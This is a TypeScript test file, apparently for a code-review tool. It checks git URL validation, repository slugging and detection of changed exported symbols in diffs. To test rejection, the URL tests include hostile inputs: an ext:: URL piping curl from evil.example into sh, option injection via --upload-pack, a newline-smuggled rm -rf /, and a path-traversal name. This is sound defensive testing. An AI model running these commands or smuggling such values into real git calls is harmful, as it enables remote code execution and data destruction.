import { describe, expect, it } from "vitest";
import { parseUnifiedDiff } from "@/lib/git/diff";
import { changedExportedSymbols, declarationsInLine, isTypeScriptPath } from "@/lib/git/symbols";
import { InvalidGitUrlError, projectNameFromUrl, repoSlug, validateGitUrl } from "@/lib/git/url";

describe("git URL validation", () => {
  it("accepts the forms a hosting provider hands out", () => {
    for (const url of [
      "https://github.com/acme/widget.git",
      "http://internal.example/acme/widget",
      "git@github.com:acme/widget.git",
      "ssh://git@example.com:2222/acme/widget.git",
      "git://example.com/acme/widget.git",
      "file:///srv/repos/widget.git",
      "/srv/repos/widget.git",
    ]) {
      expect(() => validateGitUrl(url), url).not.toThrow();
    }
  });

  it("rejects the ext transport, which runs an arbitrary command", () => {
    // git's ext:: transport executes the command in the URL. Cloning a URL a
    // user pasted must never be able to run something.
    expect(() => validateGitUrl("ext::sh -c 'curl evil.example | sh'")).toThrow(InvalidGitUrlError);
    expect(() => validateGitUrl("EXT::whoami")).toThrow(/runs an arbitrary command/);
    expect(() => validateGitUrl("fd::7")).toThrow(InvalidGitUrlError);
  });

  it("rejects a URL that git would read as an option", () => {
    expect(() => validateGitUrl("--upload-pack=touch /tmp/pwned")).toThrow(/reads as an option/);
    expect(() => validateGitUrl("-c core.pager=sh")).toThrow(InvalidGitUrlError);
  });

  it("rejects embedded newlines and null bytes", () => {
    expect(() => validateGitUrl("https://example.com/a\nrm -rf /")).toThrow(/newline/);
    expect(() => validateGitUrl("https://example.com/a\0b")).toThrow(/null byte/);
  });

  it("rejects an empty or unrecognised address", () => {
    expect(() => validateGitUrl("   ")).toThrow(/it is empty/);
    expect(() => validateGitUrl("not a url at all")).toThrow(InvalidGitUrlError);
  });

  it("derives a sensible project name", () => {
    expect(projectNameFromUrl("https://github.com/acme/widget.git")).toBe("widget");
    expect(projectNameFromUrl("git@github.com:acme/shared-core.git")).toBe("shared-core");
    expect(projectNameFromUrl("https://example.com/acme/widget/")).toBe("widget");
    expect(projectNameFromUrl("/srv/repos/legacy")).toBe("legacy");
  });

  it("slugs a name safely for use as a directory the model will read", () => {
    expect(repoSlug("Shared Core")).toBe("shared-core");
    expect(repoSlug("@acme/widget")).toBe("acme-widget");
    expect(repoSlug("../escape")).toBe("escape");
    expect(repoSlug("")).toBe("repository");
  });

  it("never produces a slug containing a path separator", () => {
    for (const name of ["a/b", "..", "../../etc/passwd", "x\\y"]) {
      const slug = repoSlug(name);
      expect(slug.includes("/"), name).toBe(false);
      expect(slug.includes("\\"), name).toBe(false);
      expect(slug).not.toBe("..");
    }
  });
});

describe("exported symbol detection", () => {
  it("recognises each kind of exported declaration", () => {
    expect(declarationsInLine("export interface Order { id: string }")).toEqual([
      { name: "Order", kind: "interface" },
    ]);
    expect(declarationsInLine("export type Money = number;")).toEqual([
      { name: "Money", kind: "type" },
    ]);
    expect(declarationsInLine("export abstract class Repo {}")).toEqual([
      { name: "Repo", kind: "class" },
    ]);
    expect(declarationsInLine("export async function fetchOrder() {}")).toEqual([
      { name: "fetchOrder", kind: "function" },
    ]);
    expect(declarationsInLine("export const TAX_RATE = 0.15;")).toEqual([
      { name: "TAX_RATE", kind: "const" },
    ]);
    expect(declarationsInLine("export enum Status { Open }")).toEqual([
      { name: "Status", kind: "enum" },
    ]);
    expect(declarationsInLine("export default function App() {}")[0]?.name).toBe("default");
  });

  it("reads every name out of a list export, including aliases", () => {
    expect(declarationsInLine("export { a, b as c };").map((d) => d.name)).toEqual(["a", "c"]);
    expect(declarationsInLine("export type { Order, Money };").map((d) => d.name)).toEqual([
      "Order",
      "Money",
    ]);
  });

  it("ignores lines that are not exports", () => {
    expect(declarationsInLine("const internal = 1;")).toEqual([]);
    expect(declarationsInLine("import { thing } from './x';")).toEqual([]);
    expect(declarationsInLine("// export const commented = 1;")).toEqual([]);
  });

  it("only considers TypeScript files", () => {
    expect(isTypeScriptPath("src/a.ts")).toBe(true);
    expect(isTypeScriptPath("src/a.tsx")).toBe(true);
    expect(isTypeScriptPath("src/a.d.ts")).toBe(true);
    expect(isTypeScriptPath("README.md")).toBe(false);
    expect(isTypeScriptPath("src/a.js")).toBe(false);
  });

  it("classifies a renamed field on an interface as a modification, not an addition", () => {
    // This is the dangerous shape: it still compiles where it is defined, and
    // only breaks at the consumer.
    const patch = [
      "diff --git a/src/types.ts b/src/types.ts",
      "--- a/src/types.ts",
      "+++ b/src/types.ts",
      "@@ -1,4 +1,4 @@",
      "-export interface Order {",
      "-  reportAutoNavigate: boolean;",
      "+export interface Order {",
      "+  autoNavigateDestination: string;",
      " }",
      "",
    ].join("\n");

    const symbols = changedExportedSymbols(parseUnifiedDiff(patch));
    expect(symbols).toEqual([
      { name: "Order", path: "src/types.ts", kind: "interface", change: "modified" },
    ]);
  });

  it("separates symbols that were added from ones that were removed", () => {
    const patch = [
      "diff --git a/src/api.ts b/src/api.ts",
      "--- a/src/api.ts",
      "+++ b/src/api.ts",
      "@@ -1,3 +1,3 @@",
      "-export const legacyTotal = 1;",
      "+export const total = 1;",
      " const untouched = 2;",
      "",
    ].join("\n");

    const symbols = changedExportedSymbols(parseUnifiedDiff(patch));
    expect(symbols).toEqual([
      { name: "legacyTotal", path: "src/api.ts", kind: "const", change: "removed" },
      { name: "total", path: "src/api.ts", kind: "const", change: "added" },
    ]);
  });

  it("ignores changes to files that cannot declare a TypeScript contract", () => {
    const patch = [
      "diff --git a/README.md b/README.md",
      "--- a/README.md",
      "+++ b/README.md",
      "@@ -1 +1 @@",
      "-export interface NotReallyCode {}",
      "+export interface StillNotCode {}",
      "",
    ].join("\n");
    expect(changedExportedSymbols(parseUnifiedDiff(patch))).toEqual([]);
  });
});
